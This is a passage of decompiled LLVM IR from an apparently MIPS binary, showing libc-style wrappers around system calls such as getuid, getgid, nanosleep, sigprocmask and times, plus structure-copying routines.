  br label %dec_label_pc_4070e4

dec_label_pc_4070e4:                              ; preds = %dec_label_pc_4070a0, %dec_label_pc_4070cc
  %v0_4070e4 = phi i32 [ %v0_4070c0, %dec_label_pc_4070a0 ], [ -1, %dec_label_pc_4070cc ]
  ret i32 %v0_4070e4

; uselistorder directives
  uselistorder label %dec_label_pc_4070e4, { 1, 0 }
}

define i32 @function_407100() local_unnamed_addr {
dec_label_pc_407100:
  %s0.global-to-local = alloca i32, align 4
  %v0_407120 = call i32 @geteuid()
  %v3_407124 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_407124, i32* @t9, align 4
  %v0_407128 = load i32, i32* @a3, align 4
  %v1_407128 = icmp eq i32 %v0_407128, 0
  store i32 %v0_407120, i32* %s0.global-to-local, align 4
  br i1 %v1_407128, label %dec_label_pc_407144, label %dec_label_pc_40712c

dec_label_pc_40712c:                              ; preds = %dec_label_pc_407100
  %v1_407130 = call i32 @function_405490()
  %v0_40713c = load i32, i32* %s0.global-to-local, align 4
  %v2_40713c = inttoptr i32 %v1_407130 to i32*
  store i32 %v0_40713c, i32* %v2_40713c, align 4
  store i32 -1, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_407144

dec_label_pc_407144:                              ; preds = %dec_label_pc_407100, %dec_label_pc_40712c
  %v0_407144 = phi i32 [ %v0_407120, %dec_label_pc_407100 ], [ -1, %dec_label_pc_40712c ]
  ret i32 %v0_407144

; uselistorder directives
  uselistorder label %dec_label_pc_407144, { 1, 0 }
}

define i32 @function_407160() local_unnamed_addr {
dec_label_pc_407160:
  %s0.global-to-local = alloca i32, align 4
  %v0_407180 = call i32 @getgid()
  %v3_407184 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_407184, i32* @t9, align 4
  %v0_407188 = load i32, i32* @a3, align 4
  %v1_407188 = icmp eq i32 %v0_407188, 0
  store i32 %v0_407180, i32* %s0.global-to-local, align 4
  br i1 %v1_407188, label %dec_label_pc_4071a4, label %dec_label_pc_40718c

dec_label_pc_40718c:                              ; preds = %dec_label_pc_407160
  %v1_407190 = call i32 @function_405490()
  %v0_40719c = load i32, i32* %s0.global-to-local, align 4
  %v2_40719c = inttoptr i32 %v1_407190 to i32*
  store i32 %v0_40719c, i32* %v2_40719c, align 4
  br label %dec_label_pc_4071a4

dec_label_pc_4071a4:                              ; preds = %dec_label_pc_407160, %dec_label_pc_40718c
  %v4_4071ac = phi i32 [ %v0_407180, %dec_label_pc_407160 ], [ -1, %dec_label_pc_40718c ]
  ret i32 %v4_4071ac

; uselistorder directives
  uselistorder label %dec_label_pc_4071a4, { 1, 0 }
}

define i32 @function_4071c0() local_unnamed_addr {
dec_label_pc_4071c0:
  %s0.global-to-local = alloca i32, align 4
  %v0_4071e0 = call i32 @getuid()
  %v3_4071e4 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_4071e4, i32* @t9, align 4
  %v0_4071e8 = load i32, i32* @a3, align 4
  %v1_4071e8 = icmp eq i32 %v0_4071e8, 0
  store i32 %v0_4071e0, i32* %s0.global-to-local, align 4
  br i1 %v1_4071e8, label %dec_label_pc_407204, label %dec_label_pc_4071ec

dec_label_pc_4071ec:                              ; preds = %dec_label_pc_4071c0
  %v1_4071f0 = call i32 @function_405490()
  %v0_4071fc = load i32, i32* %s0.global-to-local, align 4
  %v2_4071fc = inttoptr i32 %v1_4071f0 to i32*
  store i32 %v0_4071fc, i32* %v2_4071fc, align 4
  br label %dec_label_pc_407204

dec_label_pc_407204:                              ; preds = %dec_label_pc_4071c0, %dec_label_pc_4071ec
  %v4_40720c = phi i32 [ %v0_4071e0, %dec_label_pc_4071c0 ], [ -1, %dec_label_pc_4071ec ]
  ret i32 %v4_40720c

; uselistorder directives
  uselistorder label %dec_label_pc_407204, { 1, 0 }
}

define i32 @function_407220(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407294:
  %a0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 4140, i32* %v0.global-to-local, align 4
  %v3_40726c = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_40726c, i32* @t9, align 4
  store i32 4140, i32* %a0.global-to-local, align 4
  %v1_40727c = call i32 @function_405490()
  store i32 %v1_40727c, i32* %v0.global-to-local, align 4
  store i32 -1, i32* %a0.global-to-local, align 4
  %v2_407290 = inttoptr i32 %v1_40727c to i32*
  store i32 4140, i32* %v2_407290, align 4
  %v0_407294.pr = load i32, i32* %v0.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_407294.pr, 0
  br i1 %phitmp, label %dec_label_pc_4072a8, label %dec_label_pc_407298

dec_label_pc_407298:                              ; preds = %dec_label_pc_407294
  %v0_40729c = load i32, i32* %a0.global-to-local, align 4
  %v1_4072a4 = ashr i32 %v0_40729c, 31
  store i32 %v1_4072a4, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4072a8

dec_label_pc_4072a8:                              ; preds = %dec_label_pc_407294, %dec_label_pc_407298
  %v3_4072ac = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_4072ac, i32* %v0.global-to-local, align 4
  ret i32 %v3_4072ac

; uselistorder directives
  uselistorder i32* %v0.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder label %dec_label_pc_4072a8, { 1, 0 }
}

define i32 @function_4072d0(%timespec* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4072d0:
  %s0.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to %timespec*
  %v6_4072f0 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp)
  %v3_4072f4 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_4072f4, i32* @t9, align 4
  %v1_4072f8 = icmp eq i32 %arg3, 0
  store i32 %v6_4072f0, i32* %s0.global-to-local, align 4
  br i1 %v1_4072f8, label %dec_label_pc_407314, label %dec_label_pc_4072fc

dec_label_pc_4072fc:                              ; preds = %dec_label_pc_4072d0
  %v1_407300 = call i32 @function_405490()
  %v0_40730c = load i32, i32* %s0.global-to-local, align 4
  %v2_40730c = inttoptr i32 %v1_407300 to i32*
  store i32 %v0_40730c, i32* %v2_40730c, align 4
  br label %dec_label_pc_407314

dec_label_pc_407314:                              ; preds = %dec_label_pc_4072d0, %dec_label_pc_4072fc
  %v4_40731c = phi i32 [ %v6_4072f0, %dec_label_pc_4072d0 ], [ -1, %dec_label_pc_4072fc ]
  ret i32 %v4_40731c

; uselistorder directives
  uselistorder label %dec_label_pc_407314, { 1, 0 }
}

define i32 @function_407330(i32 %arg1) local_unnamed_addr {
dec_label_pc_407330:
  %s1.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v3_407350 = load i32, i32* bitcast (i32** @global_var_4492e8.34 to i32*), align 4
  store i32 %arg1, i32* %s1.global-to-local, align 4
  store i32 %v3_407350, i32* %v0.global-to-local, align 4
  %v3_40735c = load i32, i32* @global_var_4493e0.398, align 4
  store i32 %v3_40735c, i32* @t9, align 4
  %v1_407360 = icmp eq i32 %v3_407350, 0
  br i1 %v1_407360, label %dec_label_pc_407364, label %dec_label_pc_407384

dec_label_pc_407364:                              ; preds = %dec_label_pc_407330
  %v3_407368 = call i32 @function_407e50(i32* null)
  store i32 %v3_407368, i32* %v0.global-to-local, align 4
  %v1_407374 = icmp slt i32 %v3_407368, 0
  br i1 %v1_407374, label %dec_label_pc_4073a4, label %dec_label_pc_407378

dec_label_pc_407378:                              ; preds = %dec_label_pc_407364
  %v3_40737c = load i32, i32* @global_var_4493e0.398, align 4
  %v2_407380 = load i32, i32* bitcast (i32** @global_var_4492e8.34 to i32*), align 4
  store i32 %v2_407380, i32* %v0.global-to-local, align 4
  %v0_407384.pre = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_407384

dec_label_pc_407384:                              ; preds = %dec_label_pc_407330, %dec_label_pc_407378
  %v0_407390 = phi i32 [ %v3_40735c, %dec_label_pc_407330 ], [ %v3_40737c, %dec_label_pc_407378 ]
  %v0_40738c = phi i32 [ %v3_407350, %dec_label_pc_407330 ], [ %v2_407380, %dec_label_pc_407378 ]
  %v1_40738c = phi i32 [ %arg1, %dec_label_pc_407330 ], [ %v0_407384.pre, %dec_label_pc_407378 ]
  %v1_407384 = icmp eq i32 %v1_40738c, 0
  br i1 %v1_407384, label %dec_label_pc_4073a8, label %dec_label_pc_407388

dec_label_pc_407388:                              ; preds = %dec_label_pc_407384
  call void @__pseudo_call(i32 %v0_407390)
  %v0_40739c = load i32, i32* %v0.global-to-local, align 4
  %v1_40739c = icmp sgt i32 %v0_40739c, -1
  store i32 %v0_40738c, i32* %v0.global-to-local, align 4
  br i1 %v1_40739c, label %dec_label_pc_4073ac, label %dec_label_pc_4073a4

dec_label_pc_4073a4:                              ; preds = %dec_label_pc_407388, %dec_label_pc_407364
  br label %dec_label_pc_4073a8

dec_label_pc_4073a8:                              ; preds = %dec_label_pc_407384, %dec_label_pc_4073a4
  %v0_4073a8 = phi i32 [ %v0_40738c, %dec_label_pc_407384 ], [ -1, %dec_label_pc_4073a4 ]
  store i32 %v0_4073a8, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4073ac

dec_label_pc_4073ac:                              ; preds = %dec_label_pc_407388, %dec_label_pc_4073a8
  %v4_4073b8 = phi i32 [ %v0_40738c, %dec_label_pc_407388 ], [ %v0_4073a8, %dec_label_pc_4073a8 ]
  ret i32 %v4_4073b8

; uselistorder directives
  uselistorder i32 %v0_40738c, { 1, 2, 0 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32* null, { 1, 0, 2, 7, 3, 8, 4, 5, 6 }
  uselistorder label %dec_label_pc_4073ac, { 1, 0 }
  uselistorder label %dec_label_pc_4073a8, { 1, 0 }
  uselistorder label %dec_label_pc_407384, { 1, 0 }
}

define i32 @function_4073c0(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4073c0:
  %a0.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %v2_4073e0 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_4073e0, label %dec_label_pc_407410, label %dec_label_pc_4073e4

dec_label_pc_4073e4:                              ; preds = %dec_label_pc_4073c0
  %v1_4073dc = add i32 %arg1, -1
  %v4_4073e0 = icmp ult i32 %v1_4073dc, 3
  %v3_4073e8 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_4073e8, i32* @t9, align 4
  %v1_4073ec = icmp eq i1 %v4_4073e0, false
  store i32 16, i32* @a3, align 4
  br i1 %v1_4073ec, label %dec_label_pc_4073f0, label %dec_label_pc_407414

dec_label_pc_4073f0:                              ; preds = %dec_label_pc_4073e4
  %v1_4073f4 = call i32 @function_405490()
  store i32 -1, i32* %a0.global-to-local, align 4
  %v2_40740c = inttoptr i32 %v1_4073f4 to i32*
  store i32 22, i32* %v2_40740c, align 4
  %v0_407418.pre.pre = load i32, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_407410

dec_label_pc_407410:                              ; preds = %dec_label_pc_4073c0, %dec_label_pc_4073f0
  %v0_407418.pre = phi i32 [ %arg1, %dec_label_pc_4073c0 ], [ %v0_407418.pre.pre, %dec_label_pc_4073f0 ]
  store i32 16, i32* @a3, align 4
  br label %dec_label_pc_407414

dec_label_pc_407414:                              ; preds = %dec_label_pc_4073e4, %dec_label_pc_407410
  %v0_407418 = phi i32 [ %arg1, %dec_label_pc_4073e4 ], [ %v0_407418.pre, %dec_label_pc_407410 ]
  %v7_407418 = call i32 @sigprocmask(i32 %v0_407418, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  %v3_40741c = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_40741c, i32* @t9, align 4
  store i32 %v7_407418, i32* %s0.global-to-local, align 4
  %v0_407424 = load i32, i32* @a3, align 4
  %v1_407424 = icmp eq i32 %v0_407424, 0
  store i32 %v7_407418, i32* %a0.global-to-local, align 4
  br i1 %v1_407424, label %dec_label_pc_407440, label %dec_label_pc_407428

dec_label_pc_407428:                              ; preds = %dec_label_pc_407414
  %v1_40742c = call i32 @function_405490()
  store i32 -1, i32* %a0.global-to-local, align 4
  %v0_40743c = load i32, i32* %s0.global-to-local, align 4
  %v2_40743c = inttoptr i32 %v1_40742c to i32*
  store i32 %v0_40743c, i32* %v2_40743c, align 4
  %v0_407448.pre = load i32, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_407440

dec_label_pc_407440:                              ; preds = %dec_label_pc_407414, %dec_label_pc_407428
  %v0_407448 = phi i32 [ %v7_407418, %dec_label_pc_407414 ], [ %v0_407448.pre, %dec_label_pc_407428 ]
  ret i32 %v0_407448

; uselistorder directives
  uselistorder i32* %a0.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 22, { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_407440, { 1, 0 }
  uselistorder label %dec_label_pc_407414, { 1, 0 }
  uselistorder label %dec_label_pc_407410, { 1, 0 }
}

define i32 @function_407460(%tms* %arg1) local_unnamed_addr {
dec_label_pc_407460:
  %s0.global-to-local = alloca i32, align 4
  %v3_407480 = call i32 @times(%tms* %arg1)
  %v3_407484 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_407484, i32* @t9, align 4
  %v0_407488 = load i32, i32* @a3, align 4
  %v1_407488 = icmp eq i32 %v0_407488, 0
  store i32 %v3_407480, i32* %s0.global-to-local, align 4
  br i1 %v1_407488, label %dec_label_pc_4074a4, label %dec_label_pc_40748c

dec_label_pc_40748c:                              ; preds = %dec_label_pc_407460
  %v1_407490 = call i32 @function_405490()
  %v0_40749c = load i32, i32* %s0.global-to-local, align 4
  %v2_40749c = inttoptr i32 %v1_407490 to i32*
  store i32 %v0_40749c, i32* %v2_40749c, align 4
  br label %dec_label_pc_4074a4

dec_label_pc_4074a4:                              ; preds = %dec_label_pc_407460, %dec_label_pc_40748c
  %v4_4074ac = phi i32 [ %v3_407480, %dec_label_pc_407460 ], [ -1, %dec_label_pc_40748c ]
  ret i32 %v4_4074ac

; uselistorder directives
  uselistorder label %dec_label_pc_4074a4, { 1, 0 }
}

define i32 @function_4074c0(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4074c0:
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %s0.global-to-local, align 4
  store i32 %tmp, i32* %s1.global-to-local, align 4
  %v4_4074f4 = inttoptr i32 %arg2 to i32*
  %v5_4074f4 = call i32 @function_405520(i32* %v4_4074f4, i32 0, i32 160)
  store i32 %v5_4074f4, i32* %v0.global-to-local, align 4
  %v2_4074fc = load i32, i32* %arg1, align 4
  store i32 %v2_4074fc, i32* %v0.global-to-local, align 4
  %v0_407504 = load i32, i32* %s0.global-to-local, align 4
  %v1_407504 = inttoptr i32 %v0_407504 to i32*
  store i32 0, i32* %v1_407504, align 4
  %v0_407508 = load i32, i32* %v0.global-to-local, align 4
  %v1_407508 = load i32, i32* %s0.global-to-local, align 4
  %v2_407508 = add i32 %v1_407508, 4
  %v3_407508 = inttoptr i32 %v2_407508 to i32*
  store i32 %v0_407508, i32* %v3_407508, align 4
  %v0_40750c = load i32, i32* %s1.global-to-local, align 4
  %v1_40750c = add i32 %v0_40750c, 20
  %v2_40750c = inttoptr i32 %v1_40750c to i32*
  %v3_40750c = load i32, i32* %v2_40750c, align 4
  store i32 %v3_40750c, i32* %v1.global-to-local, align 4
  %v1_407510 = add i32 %v0_40750c, 16
  %v2_407510 = inttoptr i32 %v1_407510 to i32*
  %v3_407510 = load i32, i32* %v2_407510, align 4
  store i32 %v3_407510, i32* %v0.global-to-local, align 4
  %v1_407514 = load i32, i32* %s0.global-to-local, align 4
  %v2_407514 = add i32 %v1_407514, 20
  %v3_407514 = inttoptr i32 %v2_407514 to i32*
  store i32 %v3_40750c, i32* %v3_407514, align 4
  %v0_407518 = load i32, i32* %v0.global-to-local, align 4
  %v1_407518 = load i32, i32* %s0.global-to-local, align 4
  %v2_407518 = add i32 %v1_407518, 16
  %v3_407518 = inttoptr i32 %v2_407518 to i32*
  store i32 %v0_407518, i32* %v3_407518, align 4
  %v0_40751c = load i32, i32* %s1.global-to-local, align 4
  %v1_40751c = add i32 %v0_40751c, 24
  %v2_40751c = inttoptr i32 %v1_40751c to i32*
  %v3_40751c = load i32, i32* %v2_40751c, align 4
  store i32 %v3_40751c, i32* %v0.global-to-local, align 4
  %v1_407524 = load i32, i32* %s0.global-to-local, align 4
  %v2_407524 = add i32 %v1_407524, 24
  %v3_407524 = inttoptr i32 %v2_407524 to i32*
  store i32 %v3_40751c, i32* %v3_407524, align 4
  %v0_407528 = load i32, i32* %s1.global-to-local, align 4
  %v1_407528 = add i32 %v0_407528, 28
  %v2_407528 = inttoptr i32 %v1_407528 to i32*
  %v3_407528 = load i32, i32* %v2_407528, align 4
  store i32 %v3_407528, i32* %v0.global-to-local, align 4
  %v1_407530 = load i32, i32* %s0.global-to-local, align 4
  %v2_407530 = add i32 %v1_407530, 28
  %v3_407530 = inttoptr i32 %v2_407530 to i32*
  store i32 %v3_407528, i32* %v3_407530, align 4
  %v0_407534 = load i32, i32* %s1.global-to-local, align 4
  %v1_407534 = add i32 %v0_407534, 32
  %v2_407534 = inttoptr i32 %v1_407534 to i32*
  %v3_407534 = load i32, i32* %v2_407534, align 4
  store i32 %v3_407534, i32* %v0.global-to-local, align 4
  %v1_40753c = load i32, i32* %s0.global-to-local, align 4
  %v2_40753c = add i32 %v1_40753c, 32
  %v3_40753c = inttoptr i32 %v2_40753c to i32*
  store i32 %v3_407534, i32* %v3_40753c, align 4
  %v0_407540 = load i32, i32* %s1.global-to-local, align 4
  %v1_407540 = add i32 %v0_407540, 36
  %v2_407540 = inttoptr i32 %v1_407540 to i32*
  %v3_407540 = load i32, i32* %v2_407540, align 4
  store i32 %v3_407540, i32* %v0.global-to-local, align 4
  %v1_407548 = load i32, i32* %s0.global-to-local, align 4
  %v2_407548 = add i32 %v1_407548, 36
  %v3_407548 = inttoptr i32 %v2_407548 to i32*
  store i32 %v3_407540, i32* %v3_407548, align 4
  %v0_40754c = load i32, i32* %s1.global-to-local, align 4
  %v1_40754c = add i32 %v0_40754c, 40
  %v2_40754c = inttoptr i32 %v1_40754c to i32*
  %v3_40754c = load i32, i32* %v2_40754c, align 4
  store i32 %v3_40754c, i32* %v0.global-to-local, align 4
  %v0_407550 = load i32, i32* %s0.global-to-local, align 4
  %v1_407550 = add i32 %v0_407550, 40
  %v2_407550 = inttoptr i32 %v1_407550 to i32*
  store i32 0, i32* %v2_407550, align 4
  %v0_407554 = load i32, i32* %v0.global-to-local, align 4
  %v1_407554 = load i32, i32* %s0.global-to-local, align 4
  %v2_407554 = add i32 %v1_407554, 44
  %v3_407554 = inttoptr i32 %v2_407554 to i32*
  store i32 %v0_407554, i32* %v3_407554, align 4
  %v0_407558 = load i32, i32* %s1.global-to-local, align 4
  %v1_407558 = add i32 %v0_407558, 60
  %v2_407558 = inttoptr i32 %v1_407558 to i32*
  %v3_407558 = load i32, i32* %v2_407558, align 4
  store i32 %v3_407558, i32* %v1.global-to-local, align 4
  %v1_40755c = add i32 %v0_407558, 56
  %v2_40755c = inttoptr i32 %v1_40755c to i32*
  %v3_40755c = load i32, i32* %v2_40755c, align 4
  store i32 %v3_40755c, i32* %v0.global-to-local, align 4
  %v1_407560 = load i32, i32* %s0.global-to-local, align 4
  %v2_407560 = add i32 %v1_407560, 60
  %v3_407560 = inttoptr i32 %v2_407560 to i32*
  store i32 %v3_407558, i32* %v3_407560, align 4
  %v0_407564 = load i32, i32* %v0.global-to-local, align 4
  %v1_407564 = load i32, i32* %s0.global-to-local, align 4
  %v2_407564 = add i32 %v1_407564, 56
  %v3_407564 = inttoptr i32 %v2_407564 to i32*
  store i32 %v0_407564, i32* %v3_407564, align 4
  %v0_407568 = load i32, i32* %s1.global-to-local, align 4
  %v1_407568 = add i32 %v0_407568, 88
  %v2_407568 = inttoptr i32 %v1_407568 to i32*
  %v3_407568 = load i32, i32* %v2_407568, align 4
  store i32 %v3_407568, i32* %v0.global-to-local, align 4
  %v1_407570 = load i32, i32* %s0.global-to-local, align 4
  %v2_407570 = add i32 %v1_407570, 88
  %v3_407570 = inttoptr i32 %v2_407570 to i32*
  store i32 %v3_407568, i32* %v3_407570, align 4
  %v0_407574 = load i32, i32* %s1.global-to-local, align 4
  %v1_407574 = add i32 %v0_407574, 96
  %v2_407574 = inttoptr i32 %v1_407574 to i32*
  %v3_407574 = load i32, i32* %v2_407574, align 4
  store i32 %v3_407574, i32* %v0.global-to-local, align 4
  %v1_407578 = add i32 %v0_407574, 100
  %v2_407578 = inttoptr i32 %v1_407578 to i32*
  %v3_407578 = load i32, i32* %v2_407578, align 4
  store i32 %v3_407578, i32* %v1.global-to-local, align 4
  %v1_40757c = load i32, i32* %s0.global-to-local, align 4
  %v2_40757c = add i32 %v1_40757c, 96
  %v3_40757c = inttoptr i32 %v2_40757c to i32*
  store i32 %v3_407574, i32* %v3_40757c, align 4
  %v0_407580 = load i32, i32* %v1.global-to-local, align 4
  %v1_407580 = load i32, i32* %s0.global-to-local, align 4
  %v2_407580 = add i32 %v1_407580, 100
  %v3_407580 = inttoptr i32 %v2_407580 to i32*
  store i32 %v0_407580, i32* %v3_407580, align 4
  %v0_407584 = load i32, i32* %s1.global-to-local, align 4
  %v1_407584 = add i32 %v0_407584, 64
  %v2_407584 = inttoptr i32 %v1_407584 to i32*
  %v3_407584 = load i32, i32* %v2_407584, align 4
  store i32 %v3_407584, i32* %v0.global-to-local, align 4
  %v1_40758c = load i32, i32* %s0.global-to-local, align 4
  %v2_40758c = add i32 %v1_40758c, 64
  %v3_40758c = inttoptr i32 %v2_40758c to i32*
  store i32 %v3_407584, i32* %v3_40758c, align 4
  %v0_407590 = load i32, i32* %s1.global-to-local, align 4
  %v1_407590 = add i32 %v0_407590, 72
  %v2_407590 = inttoptr i32 %v1_407590 to i32*
  %v3_407590 = load i32, i32* %v2_407590, align 4
  store i32 %v3_407590, i32* %v0.global-to-local, align 4
  %v1_407598 = load i32, i32* %s0.global-to-local, align 4
  %v2_407598 = add i32 %v1_407598, 72
  %v3_407598 = inttoptr i32 %v2_407598 to i32*
  store i32 %v3_407590, i32* %v3_407598, align 4
  %v0_40759c = load i32, i32* %s1.global-to-local, align 4
  %v1_40759c = add i32 %v0_40759c, 80
  %v2_40759c = inttoptr i32 %v1_40759c to i32*
  %v3_40759c = load i32, i32* %v2_40759c, align 4
  store i32 %v3_40759c, i32* %v0.global-to-local, align 4
  %v1_4075a4 = load i32, i32* %s0.global-to-local, align 4
  %v2_4075a4 = add i32 %v1_4075a4, 80
  %v3_4075a4 = inttoptr i32 %v2_4075a4 to i32*
  store i32 %v3_40759c, i32* %v3_4075a4, align 4
  %v0_4075a8 = load i32, i32* %s1.global-to-local, align 4
  %v1_4075a8 = add i32 %v0_4075a8, 68
  %v2_4075a8 = inttoptr i32 %v1_4075a8 to i32*
  %v3_4075a8 = load i32, i32* %v2_4075a8, align 4
  store i32 %v3_4075a8, i32* %v0.global-to-local, align 4
  %v1_4075b0 = load i32, i32* %s0.global-to-local, align 4
  %v2_4075b0 = add i32 %v1_4075b0, 68
  %v3_4075b0 = inttoptr i32 %v2_4075b0 to i32*
  store i32 %v3_4075a8, i32* %v3_4075b0, align 4
  %v0_4075b4 = load i32, i32* %s1.global-to-local, align 4
  %v1_4075b4 = add i32 %v0_4075b4, 76
  %v2_4075b4 = inttoptr i32 %v1_4075b4 to i32*
  %v3_4075b4 = load i32, i32* %v2_4075b4, align 4
  store i32 %v3_4075b4, i32* %v0.global-to-local, align 4
  %v1_4075bc = load i32, i32* %s0.global-to-local, align 4
  %v2_4075bc = add i32 %v1_4075bc, 76
  %v3_4075bc = inttoptr i32 %v2_4075bc to i32*
  store i32 %v3_4075b4, i32* %v3_4075bc, align 4
  %v0_4075c0 = load i32, i32* %s1.global-to-local, align 4
  %v1_4075c0 = add i32 %v0_4075c0, 84
  %v2_4075c0 = inttoptr i32 %v1_4075c0 to i32*
  %v3_4075c0 = load i32, i32* %v2_4075c0, align 4
  store i32 %v3_4075c0, i32* %v0.global-to-local, align 4
  %v1_4075c8 = load i32, i32* %s0.global-to-local, align 4
  %v2_4075c8 = add i32 %v1_4075c8, 84
  %v3_4075c8 = inttoptr i32 %v2_4075c8 to i32*
  store i32 %v3_4075c0, i32* %v3_4075c8, align 4
  ret i32 %v3_4075c0

; uselistorder directives
  uselistorder i32* %s0.global-to-local, { 0, 1, 2, 3, 12, 4, 5, 6, 7, 8, 9, 10, 11, 20, 13, 14, 15, 16, 17, 18, 19, 21 }
  uselistorder i32 160, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_4075e0(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4075e0:
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %s0.global-to-local, align 4
  store i32 %tmp, i32* %s1.global-to-local, align 4
  %v4_407614 = inttoptr i32 %arg2 to i32*
  %v5_407614 = call i32 @function_405520(i32* %v4_407614, i32 0, i32 152)
  store i32 %v5_407614, i32* %v0.global-to-local, align 4
  %v2_40761c = load i32, i32* %arg1, align 4
  store i32 %v2_40761c, i32* %v0.global-to-local, align 4
  %v0_407624 = load i32, i32* %s0.global-to-local, align 4
  %v1_407624 = inttoptr i32 %v0_407624 to i32*
  store i32 0, i32* %v1_407624, align 4
  %v0_407628 = load i32, i32* %v0.global-to-local, align 4
  %v1_407628 = load i32, i32* %s0.global-to-local, align 4
  %v2_407628 = add i32 %v1_407628, 4
  %v3_407628 = inttoptr i32 %v2_407628 to i32*
  store i32 %v0_407628, i32* %v3_407628, align 4
  %v0_40762c = load i32, i32* %s1.global-to-local, align 4
  %v1_40762c = add i32 %v0_40762c, 16
  %v2_40762c = inttoptr i32 %v1_40762c to i32*
  %v3_40762c = load i32, i32* %v2_40762c, align 4
  store i32 %v3_40762c, i32* %v0.global-to-local, align 4
  %v1_407634 = load i32, i32* %s0.global-to-local, align 4
  %v2_407634 = add i32 %v1_407634, 16
  %v3_407634 = inttoptr i32 %v2_407634 to i32*
  store i32 %v3_40762c, i32* %v3_407634, align 4
  %v0_407638 = load i32, i32* %s1.global-to-local, align 4
  %v1_407638 = add i32 %v0_407638, 20
  %v2_407638 = inttoptr i32 %v1_407638 to i32*
  %v3_407638 = load i32, i32* %v2_407638, align 4
  store i32 %v3_407638, i32* %v0.global-to-local, align 4
  %v1_407640 = load i32, i32* %s0.global-to-local, align 4
  %v2_407640 = add i32 %v1_407640, 20
  %v3_407640 = inttoptr i32 %v2_407640 to i32*
  store i32 %v3_407638, i32* %v3_407640, align 4
  %v0_407644 = load i32, i32* %s1.global-to-local, align 4
  %v1_407644 = add i32 %v0_407644, 24
  %v2_407644 = inttoptr i32 %v1_407644 to i32*
  %v3_407644 = load i32, i32* %v2_407644, align 4
  store i32 %v3_407644, i32* %v0.global-to-local, align 4
  %v1_40764c = load i32, i32* %s0.global-to-local, align 4
  %v2_40764c = add i32 %v1_40764c, 24
  %v3_40764c = inttoptr i32 %v2_40764c to i32*
  store i32 %v3_407644, i32* %v3_40764c, align 4
  %v0_407650 = load i32, i32* %s1.global-to-local, align 4
  %v1_407650 = add i32 %v0_407650, 28
  %v2_407650 = inttoptr i32 %v1_407650 to i32*
  %v3_407650 = load i32, i32* %v2_407650, align 4
  store i32 %v3_407650, i32* %v0.global-to-local, align 4
  %v1_407658 = load i32, i32* %s0.global-to-local, align 4
  %v2_407658 = add i32 %v1_407658, 28
  %v3_407658 = inttoptr i32 %v2_407658 to i32*
  store i32 %v3_407650, i32* %v3_407658, align 4
  %v0_40765c = load i32, i32* %s1.global-to-local, align 4
  %v1_40765c = add i32 %v0_40765c, 32
  %v2_40765c = inttoptr i32 %v1_40765c to i32*
  %v3_40765c = load i32, i32* %v2_40765c, align 4
  store i32 %v3_40765c, i32* %v0.global-to-local, align 4
  %v1_407664 = load i32, i32* %s0.global-to-local, align 4
  %v2_407664 = add i32 %v1_407664, 32
  %v3_407664 = inttoptr i32 %v2_407664 to i32*
  store i32 %v3_40765c, i32* %v3_407664, align 4
  %v0_407668 = load i32, i32* %s1.global-to-local, align 4
  %v1_407668 = add i32 %v0_407668, 36
  %v2_407668 = inttoptr i32 %v1_407668 to i32*
  %v3_407668 = load i32, i32* %v2_407668, align 4
  store i32 %v3_407668, i32* %v0.global-to-local, align 4
  %v0_40766c = load i32, i32* %s0.global-to-local, align 4
  %v1_40766c = add i32 %v0_40766c, 40
  %v2_40766c = inttoptr i32 %v1_40766c to i32*
  store i32 0, i32* %v2_40766c, align 4
  %v0_407670 = load i32, i32* %v0.global-to-local, align 4
  %v1_407670 = load i32, i32* %s0.global-to-local, align 4
  %v2_407670 = add i32 %v1_407670, 44
  %v3_407670 = inttoptr i32 %v2_407670 to i32*
  store i32 %v0_407670, i32* %v3_407670, align 4
  %v0_407674 = load i32, i32* %s1.global-to-local, align 4
